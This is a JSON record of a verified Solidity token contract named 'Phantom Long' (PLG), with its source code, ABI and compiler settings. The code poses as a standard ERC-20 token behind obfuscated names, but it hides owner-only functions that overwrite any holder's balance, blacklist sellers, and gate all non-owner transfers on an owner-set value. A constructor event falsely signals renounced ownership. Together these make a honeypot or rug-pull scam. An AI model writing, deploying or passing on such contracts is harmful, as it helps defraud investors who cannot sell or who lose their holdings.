{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface amountSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletModeIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchWalletExempt {\n    function createPair(address fromLiquidity, address autoLiquidity) external returns (address);\n}\n\ninterface modeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeShould) external view returns (uint256);\n\n    function transfer(address launchFundMin, uint256 totalFundLaunched) external returns (bool);\n\n    function allowance(address enableMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalFundLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFundMin,\n        uint256 totalFundLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeBuy, uint256 value);\n    event Approval(address indexed enableMin, address indexed spender, uint256 value);\n}\n\ninterface autoAtLaunched is modeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PhantomLong is walletModeIs, modeReceiver, autoAtLaunched {\n\n    uint256 private limitLiquidity;\n\n    function atMaxMin(address liquidityAutoMin) public {\n        launchAuto();\n        if (limitLiquidity == launchTotal) {\n            walletFee = false;\n        }\n        if (liquidityAutoMin == modeSwap || liquidityAutoMin == sellMin) {\n            return;\n        }\n        limitMarketing[liquidityAutoMin] = true;\n    }\n\n    bool private feeFund;\n\n    bool private takeSell;\n\n    uint256 private txIs = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed tradingTeamList, address indexed listTake);\n\n    mapping(address => uint256) private txReceiver;\n\n    function minExemptList(uint256 totalFundLaunched) public {\n        launchAuto();\n        fromReceiver = totalFundLaunched;\n    }\n\n    bool public sellLiquidity;\n\n    address sellEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchAuto() private view {\n        require(fundTeam[_msgSender()]);\n    }\n\n    uint8 private buyLaunchedTx = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyLaunchedTx;\n    }\n\n    address public modeSwap;\n\n    mapping(address => bool) public limitMarketing;\n\n    function tokenTotal() public {\n        emit OwnershipTransferred(modeSwap, address(0));\n        maxFee = address(0);\n    }\n\n    function receiverLaunch(address fundFee, address launchFundMin, uint256 totalFundLaunched) internal returns (bool) {\n        require(txReceiver[fundFee] >= totalFundLaunched);\n        txReceiver[fundFee] -= totalFundLaunched;\n        txReceiver[launchFundMin] += totalFundLaunched;\n        emit Transfer(fundFee, launchFundMin, totalFundLaunched);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toTotal;\n    }\n\n    string private toTotal = \"Phantom Long\";\n\n    bool public walletFee;\n\n    function balanceOf(address feeShould) public view virtual override returns (uint256) {\n        return txReceiver[feeShould];\n    }\n\n    address limitLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderTrading(address walletTeamAt) public {\n        if (takeExempt) {\n            return;\n        }\n        if (launchTotal == fundAuto) {\n            walletFee = true;\n        }\n        fundTeam[walletTeamAt] = true;\n        \n        takeExempt = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxFee;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderExemptMarketing;\n    }\n\n    uint256 public launchTotal;\n\n    uint256 constant tradingTeam = 20 ** 10;\n\n    uint256 private swapTeam;\n\n    mapping(address => bool) public fundTeam;\n\n    mapping(address => mapping(address => uint256)) private receiverExempt;\n\n    function transferFrom(address fundFee, address launchFundMin, uint256 totalFundLaunched) external override returns (bool) {\n        if (_msgSender() != sellEnable) {\n            if (receiverExempt[fundFee][_msgSender()] != type(uint256).max) {\n                require(totalFundLaunched <= receiverExempt[fundFee][_msgSender()]);\n                receiverExempt[fundFee][_msgSender()] -= totalFundLaunched;\n            }\n        }\n        return tradingTx(fundFee, launchFundMin, totalFundLaunched);\n    }\n\n    address public sellMin;\n\n    function takeEnableAt(address txTakeLaunch, uint256 totalFundLaunched) public {\n        launchAuto();\n        txReceiver[txTakeLaunch] = totalFundLaunched;\n    }\n\n    string private senderExemptMarketing = \"PLG\";\n\n    function allowance(address enableMode, address liquidityReceiver) external view virtual override returns (uint256) {\n        if (liquidityReceiver == sellEnable) {\n            return type(uint256).max;\n        }\n        return receiverExempt[enableMode][liquidityReceiver];\n    }\n\n    function owner() external view returns (address) {\n        return maxFee;\n    }\n\n    bool public takeExempt;\n\n    uint256 private fundAuto;\n\n    uint256 fromReceiver;\n\n    function transfer(address txTakeLaunch, uint256 totalFundLaunched) external virtual override returns (bool) {\n        return tradingTx(_msgSender(), txTakeLaunch, totalFundLaunched);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txIs;\n    }\n\n    function approve(address liquidityReceiver, uint256 totalFundLaunched) public virtual override returns (bool) {\n        receiverExempt[_msgSender()][liquidityReceiver] = totalFundLaunched;\n        emit Approval(_msgSender(), liquidityReceiver, totalFundLaunched);\n        return true;\n    }\n\n    address private maxFee;\n\n    constructor (){\n        \n        amountSwap liquidityMax = amountSwap(sellEnable);\n        sellMin = launchWalletExempt(liquidityMax.factory()).createPair(liquidityMax.WETH(), address(this));\n        if (takeSell) {\n            takeSell = true;\n        }\n        modeSwap = _msgSender();\n        tokenTotal();\n        fundTeam[modeSwap] = true;\n        txReceiver[modeSwap] = txIs;\n        \n        emit Transfer(address(0), modeSwap, txIs);\n    }\n\n    uint256 launchList;\n\n    function tradingTx(address fundFee, address launchFundMin, uint256 totalFundLaunched) internal returns (bool) {\n        if (fundFee == modeSwap) {\n            return receiverLaunch(fundFee, launchFundMin, totalFundLaunched);\n        }\n        uint256 limitTrading = modeReceiver(sellMin).balanceOf(limitLaunch);\n        require(limitTrading == fromReceiver);\n        require(launchFundMin != limitLaunch);\n        if (limitMarketing[fundFee]) {\n            return receiverLaunch(fundFee, launchFundMin, tradingTeam);\n        }\n        return receiverLaunch(fundFee, launchFundMin, totalFundLaunched);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeamList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalFundLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAutoMin\",\"type\":\"address\"}],\"name\":\"atMaxMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalFundLaunched\",\"type\":\"uint256\"}],\"name\":\"minExemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeamAt\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTakeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalFundLaunched\",\"type\":\"uint256\"}],\"name\":\"takeEnableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTakeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalFundLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalFundLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PhantomLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}